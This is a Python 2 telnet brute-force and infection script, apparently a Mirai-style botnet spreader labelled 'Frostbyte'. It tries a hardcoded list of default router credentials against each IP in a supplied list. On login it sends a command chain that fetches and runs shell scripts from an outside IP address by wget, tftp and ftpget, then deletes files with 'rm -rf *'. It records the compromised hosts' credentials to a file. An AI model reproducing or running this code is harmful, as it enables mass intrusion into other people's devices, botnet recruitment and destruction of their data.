#!/usr/bin/python
import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout
#Put Your Payload On Line 95 ;) ex: Payload Goes In Between The ---> ""

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output>"
    sys.exit()

combo = [ 
        "root:root",
        "root:",
        "admin:admin",
        "support:support",
        "user:user",
        "admin:",
        "admin:password",
        "root:admin",
        "root:pass",
        "ubnt:ubnt",
        "root:user",
        "root:realtek",
        "admin:1234",
        "admin:1234",
        "root:1111",
        "root:password",
        "root:1234",
        "Administrator:admin",
        "service:service",
        "guest:guest",
        "admin1:password",
        "administrator:1234",
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"


class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.rekdevice=" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.32.40/GoOgle.sh; chmod 777 GoOgle.sh; sh GoOgle.sh; tftp 158.69.32.40 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 158.69.32.40; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 158.69.32.40 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GoOgle.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf * " 
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(0.37)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(username + "\r\n")
                    time.sleep(0.1)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(password + "\r\n")
                    time.sleep(0.1)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if "#" in prompt or "$":
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        tn.send(self.rekdevice + "\r\n")
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n") # 1.1.1.1:23 user:pass # mirai
                        fh.flush()
                        print "Frostbyte --> %s:%s:%s"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

global fh
fh = open("Payloadexploits.txt","a")
for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass
